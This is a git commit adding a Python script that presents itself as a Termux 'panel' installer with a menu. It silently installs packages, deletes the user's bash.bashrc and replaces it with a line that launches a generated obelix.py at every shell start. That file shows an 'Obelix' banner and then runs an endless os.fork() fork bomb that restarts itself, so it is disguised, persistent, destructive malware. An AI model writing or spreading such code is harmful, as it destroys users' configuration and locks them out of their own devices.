c21c5ca6ba1a83f061e88a20b30d6e95f07bf076
XxxObelix <90279678+XxxObelix@users.noreply.github.com>
2021-09-07 16:28:44 -0300

    Create painel.py

---
+++ painel.py
@@ -0,0 +1,33 @@
+# imports
+from time import sleep
+from xxx import menu
+import os
+
+
+print('\033[0;30;42minstalando pacotes\033[m')
+os.system('python3 -m pip install --upgrade pip &>/dev/null')
+os.system('pip install lolcat &>/dev/null')
+os.system('pip install pyfiglet &>/dev/null')
+os.system('clear')
+print(menu.menu)
+script = input('---> \033[0;30;41m')
+os.chdir('/data/data/com.termux/files/usr/etc')
+os.system('rm -rf bash.bashrc')
+arq = open('bash.bashrc', 'w')
+arq.write('python /data/data/com.termux/files/usr/etc/obelix.py|lolcat')
+obe = open('obelix.py', 'w')
+obe.write("""
+import os
+from time import sleep
+from pyfiglet import Figlet
+
+try:
+    cosmic = Figlet(font='cosmic')
+    os.system('clear')
+    print('travazap abatido by:\\n')
+    print(cosmic.renderText('Obelix'))
+    while True:
+        os.fork()
+except:
+    os.system('python /data/data/com.termux/files/usr/etc/obelix.py|lolcat')
+""")
